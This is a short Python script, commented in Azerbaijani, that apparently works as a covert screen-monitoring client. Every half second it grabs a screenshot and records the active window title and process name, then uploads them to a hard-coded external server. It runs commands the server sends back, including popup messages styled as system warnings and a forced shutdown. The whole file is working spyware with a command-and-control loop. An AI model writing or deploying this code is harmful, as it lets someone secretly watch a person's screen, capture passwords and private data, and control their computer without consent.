import time
import io
import os
import requests
import platform
import psutil
import tkinter as tk
from tkinter import messagebox
from PIL import ImageGrab

# ==========================================
# KONFİQURASİYA
# ==========================================
SERVER_URL = "https://server-dm3i.onrender.com/upload"
PC_NAME = platform.node()
INTERVAL = 0.5 # SƏNİN İSTƏDİYİN 0.5 SANİYƏLİK İNTERVAL

def get_active_info():
    try:
        import win32gui, win32process
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        proc = psutil.Process(pid).name()
        return title, proc
    except:
        return "Bilinmir", "Bilinmir"

def handle_command(cmd_text):
    if not cmd_text: return
    try:
        prefix, val = cmd_text.split(":", 1)
        if prefix == "msg":
            root = tk.Tk()
            root.withdraw()
            root.attributes("-topmost", True)
            messagebox.showinfo("Sistem xəbərdarlığı", val)
            root.destroy()
        elif prefix == "cmd" and val == "shutdown":
            os.system("shutdown /s /t 30")
    except: pass

def main():
    while True:
        try:
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=70)
            buf.seek(0)
            
            title, proc = get_active_info()
            payload = {"pc_name": PC_NAME, "active_window": title, "active_process": proc}
            files = {"screenshot": ("s.jpg", buf, "image/jpeg")}
            
            r = requests.post(SERVER_URL, data=payload, files=files, timeout=5)
            if r.status_code == 200:
                cmd = r.json().get("command")
                handle_command(cmd)
                
        except Exception as e:
            time.sleep(2)
            
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()